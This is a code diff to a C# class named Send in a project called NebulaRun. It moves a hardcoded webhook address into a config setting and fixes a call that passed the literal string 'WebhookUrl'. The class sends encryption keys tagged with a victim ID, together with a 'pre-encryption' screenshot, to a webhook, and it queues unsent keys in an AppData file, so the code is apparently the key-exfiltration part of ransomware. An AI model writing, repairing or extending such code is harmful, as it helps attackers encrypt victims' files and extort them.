@@ -13,7 +13,6 @@ namespace NebulaRun
 
 public static class Send
 {
-        public static string WebhookUrl = "YOUR-WEBHOOK-HERE";
         private static readonly string QueueFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "NebulaQueue.dat");
 
         public static void SendKeyAndIvAsync(string base64Key, string base64Iv, string Code)
@@ -25,7 +24,7 @@ public static class Send
                         {
                                 string jsonPayload = "{\"content\": \"ID: " + Code + "\\nKey: " + base64Key + "\"}";
                                 StringContent val = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
-                                HttpResponseMessage resp = client.PostAsync(WebhookUrl, val).Result;
+                                HttpResponseMessage resp = client.PostAsync(Config.WebhookUrl, val).Result;
                                 if (resp.IsSuccessStatusCode)
                                 {
                                         sent = true;
@@ -64,7 +63,7 @@ public static class Send
                                         {
                                                 form.Add(new StringContent("ID: " + Code + "\nScreenshot (pre-encryption)"), "content");
                                                 form.Add(new StreamContent(File.OpenRead(screenshotPath)), "file", Path.GetFileName(screenshotPath));
-                                                HttpResponseMessage sresp = client.PostAsync(WebhookUrl, form).Result;
+                                                 HttpResponseMessage sresp = client.PostAsync(Config.WebhookUrl, form).Result;
                                         }
                                 }
                         }
@@ -181,7 +180,7 @@ public static class Send
                                                                 {
                                                                 string jsonPayload = "{\"content\": \"[Offline Queue] ID: " + vCode + "\\nKey: " + bKey + "\"}";
                                                                 StringContent val = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
-                                                                HttpResponseMessage resp = await client.PostAsync("WebhookUrl", val);
+                                                                HttpResponseMessage resp = await client.PostAsync(Config.WebhookUrl, val);
                                                                 if (!resp.IsSuccessStatusCode)
                                                                 {
                                                                         remaining.Add(line);
